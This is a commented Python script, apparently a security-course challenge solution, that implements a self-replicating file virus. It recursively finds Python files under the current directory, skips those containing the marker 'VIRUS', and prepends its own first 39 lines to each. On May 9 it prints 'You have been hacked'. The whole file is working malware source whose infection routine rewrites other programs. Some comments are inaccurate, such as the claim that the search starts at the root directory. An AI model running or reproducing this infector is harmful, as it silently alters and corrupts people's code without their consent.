#!/usr/bin/env python3
#Script: Ops 301 Class 14 Ops Challenge Solution
# Author: Dericus Horner
# Date of latest revision:03/30/2023
# Assistance from ChatGPT

# Specify that this script should be ran in the Python 3 interpreter.
#!/usr/bin/python3

#this line imports a library of pre-written code that will allow the program to interact with the computer's operating system.
import os

# This line imports another library of pre-written code that will allow the program to work with dates and times.
import datetime

#This line creates a variable called Signature and assigns it the value of Virus. This variable will be used later in the program
SIGNATURE = "VIRUS"

# This line starts a function definition. A function is like a mini program inside the main program that does a specific task.
def locate(path):
   
   # This line creates an empty list that will be filled with the names of files that the program will target.
    files_targeted = []
   
   # This line uses the os library to get a list of all the files and directories in the specified path.
    filelist = os.listdir(path)
   
   # This line starts with a loop that will go through each file and directory in the path
    for fname in filelist:
   
   # This line checks if the current item being looped over is a directory. 
        if os.path.isdir(path+"/"+fname):
   
   # This line calls the locate function again with the subdirectort as the argument and extends the files_targeted list with any files found in that subdirectory.
            files_targeted.extend(locate(path+"/"+fname))
   
   # This line checks if the current item being looped over is a pythin file
        elif fname[-3:] == ".py":
   
   # This line creates a variable called infected and sets it to False.
            infected = False
   
   # This line opens the current file and loops over each line in the file.
            for line in open(path+"/"+fname):
   
   # This line checks if the signature variable is in the current line being looped over.
                if SIGNATURE in line:
   
   #If the signature variable is in the current line, this line sets the infected variable to true
                    infected = True
   
   # This line stops the loop once the signature variable has been found in the file.
                    break
   
   # This line checks if the current file hase already been infected with the virus.
            if infected == False:
   
   # If the current file has not been infected, this line adds the file to the files_targeted list.
                files_targeted.append(path+"/"+fname)
   
   # This line ends the locate function and returns the files_targeted list of files that need to be infected.
    return files_targeted

# This line starts another function definition called infect. This function takes the files_targeted list as an argument.
def infect(files_targeted):
   
   # This line opens the current script file.
    virus = open(os.path.abspath(__file__))
   
   # This line creates an empty string called virusstring.
    virusstring = ""
   
   # This line starts a loop that will go through each line of the current script file.
    for i,line in enumerate(virus):
   
   # This line checks if the current line being looped over is within the first 39 lines of the script.
        if 0 <= i < 39:
   
   # If the current line is within the first 39 lines of the script, this line adds it to the 
            virusstring += line
   
   # This line closes the virus file afterthe loop has finished reading its contents.
    virus.close
   
   # This line is part of another loop that is iterating over a list of file names called files targeted. It contain the Python files on the computer that have permission to access.
    for fname in files_targeted:
   
   # This line is opening a python file for reading. The variable "fname" contains the path of the file that is being opened.
        f = open(fname)
   
   # This line is reading the contents of the file that was opened in the previous line, and storing them in a variable called temp.
        temp = f.read()
   
   # This line is closing the file that was opened in line 6.
        f.close()
   
   # This line is opening the same file that was opened in line 6, but this time it is being opened for writing (hence the "w" parameter). This means that the contents of the file can be changed.
        f = open(fname,"w")
   
   # This line is writing the contents of the "virusstring" variable (which contains the first 39 lines of the "virus" file) to the beginning of the file, followed by the original contents of the file (stored in the "temp" variable).
        f.write(virusstring + temp)
   
   # This line is closing the file that was opened in line 9.
        f.close()

# This line is defining a function called "detonate".
def detonate():
   
   # This line is checking if the current date is May 9th. If it is, the next line will be executed.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
   
   # This line is printing a message that says "You have been hacked" to the console.
        print("You have been hacked")

# This line is calling a function called "locate", which returns a list of all the Python files on the computer that this script has permission to access. The os.path.abspath("") parameter is used to specify the starting directory for the search (in this case, the root directory of the computer).
files_targeted = locate(os.path.abspath(""))
 
 # This line is calling another function called "infect", and passing in the list of Python files that were found in the previous line. This function will modify these files by adding the first 39 lines of the "virus"
infect(files_targeted)

# The next part checks the current date and and prints it.
detonate()
